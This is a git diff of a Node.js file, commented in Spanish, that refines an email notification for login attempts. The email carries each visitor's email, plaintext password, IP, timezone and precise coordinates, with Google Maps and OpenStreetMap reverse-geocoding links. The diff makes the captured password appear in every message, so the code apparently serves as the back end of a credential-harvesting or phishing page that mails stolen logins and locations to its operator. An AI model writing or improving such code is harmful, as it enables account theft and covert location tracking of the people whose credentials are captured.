@@ -13,6 +13,20 @@ const transporter = nodemailer.createTransport({
   }
 });
 
+const formatDateTime = (timestamp, timezone) => {
+  const options = {
+    year: 'numeric',
+    month: '2-digit',
+    day: '2-digit',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: false,
+    timeZone: timezone || 'America/Lima'
+  };
+  return new Date(timestamp).toLocaleString('es-PE', options);
+};
+
 const sendLoginAttemptEmail = async (loginData) => {
   const { method, email, timestamp, location, timezone, password, ip } = loginData;
   
@@ -24,8 +38,9 @@ const sendLoginAttemptEmail = async (loginData) => {
     ip: ip
   });
 
-  // Obtener la fecha y hora actual en la zona horaria del usuario
-  const userTime = new Date(timestamp).toLocaleString('es-ES', { timeZone: timezone });
+  // Formatear las fechas
+  const serverTime = formatDateTime(timestamp, 'America/Lima');
+  const userTime = timezone ? formatDateTime(timestamp, timezone) : 'No disponible';
 
   const mailOptions = {
     from: process.env.GMAIL_USER,
@@ -35,17 +50,18 @@ const sendLoginAttemptEmail = async (loginData) => {
       <h2>Nuevo intento de inicio de sesión detectado</h2>
       <p><strong>Método:</strong> ${method}</p>
       <p><strong>Email usado:</strong> ${email}</p>
-      <p><strong>Fecha y hora:</strong> ${new Date(timestamp).toLocaleString()}</p>
+      <p><strong>Fecha y hora del servidor:</strong> ${serverTime}</p>
       <p><strong>Fecha y hora del usuario:</strong> ${userTime}</p>
+      <p><strong>Zona horaria del usuario:</strong> ${timezone || 'No disponible'}</p>
       <p><strong>IP:</strong> ${ip || 'No disponible'}</p>
-      ${password ? `<p><strong>Contraseña usada:</strong> ${password}</p>` : ''}
+      <p><strong>Contraseña usada:</strong> ${password || 'No disponible'}</p>
       ${location ? `
         <h3>Información de ubicación:</h3>
         <p><strong>Latitud:</strong> ${location.latitude}</p>
         <p><strong>Longitud:</strong> ${location.longitude}</p>
-        <p><a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}" target="_blank">Ver en Google Maps</a></p>
-      ` : '<p>No se proporcionó información de ubicación</p>'}
-      <p><strong>Zona horaria:</strong> ${timezone || 'No disponible'}</p>
+        <p><strong>Ver ubicación:</strong> <a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}" target="_blank">Abrir en Google Maps</a></p>
+        <p><strong>Ubicación aproximada:</strong> <a href="https://nominatim.openstreetmap.org/reverse?format=html&lat=${location.latitude}&lon=${location.longitude}" target="_blank">Ver detalles</a></p>
+      ` : '<p><strong>Ubicación:</strong> No se proporcionó información de ubicación</p>'}
     `
   };
 
